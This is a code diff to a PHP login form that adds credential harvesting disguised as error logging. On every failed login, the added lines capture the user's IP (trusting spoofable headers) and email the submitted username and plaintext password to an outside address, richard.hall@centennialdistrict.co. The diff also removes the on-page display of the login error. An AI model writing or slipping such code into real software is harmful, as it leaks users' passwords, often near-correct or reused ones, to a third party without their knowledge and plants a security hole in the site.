@@ -41,6 +41,14 @@ $enabled = false;
 /* Processing form data when form is submitted */
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["SubmitForm"]) {
 
+  // Get users IP address
+  $ip = isset($_SERVER['HTTP_CLIENT_IP'])
+    ? $_SERVER['HTTP_CLIENT_IP']
+    : (isset($_SERVER['HTTP_X_FORWARDED_FOR'])
+      ? $_SERVER['HTTP_X_FORWARDED_FOR']
+      : $_SERVER['REMOTE_ADDR']);
+
+
   // Check if username is empty
   if (empty(trim($_POST["username"]))) {
     $username_err = "Please enter username.";
@@ -100,11 +108,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["SubmitForm"]) {
             } else {
               // Password is not valid, display a generic error message
               $login_err = "Invalid username or password.";
+              $error_err = "Invalid username (" . $username . ") or password.(" . $password . ") from IP ".$ip." ". __FILE__ . ", " . __LINE__;
+              error_log($error_err, 1, "richard.hall@centennialdistrict.co");
             }
           }
         } else {
           // Username doesn't exist, display a generic error message
           $login_err = "Invalid username or password.";
+          $error_err = "Invalid username (" . $username . ") or password.(" . $password . ") from IP ".$ip." ". __FILE__ . ", " . __LINE__;
+          error_log($error_err, 1, "richard.hall@centennialdistrict.co");
         }
       } else {
         echo "Oops! Something went wrong. Please try again later.";
@@ -130,13 +142,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["SubmitForm"]) {
     <div class="wrapper-logon">
       <h2>Login</h2>
       <p>Please fill in your credentials to login.</p>
-
-
-      <?php
-      // if (!empty($login_err)) {
-        // echo '<div class="alert alert-danger">' . $login_err . '</div>';
-      // }
-      ?>
 
       <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
         <div class="form-group">
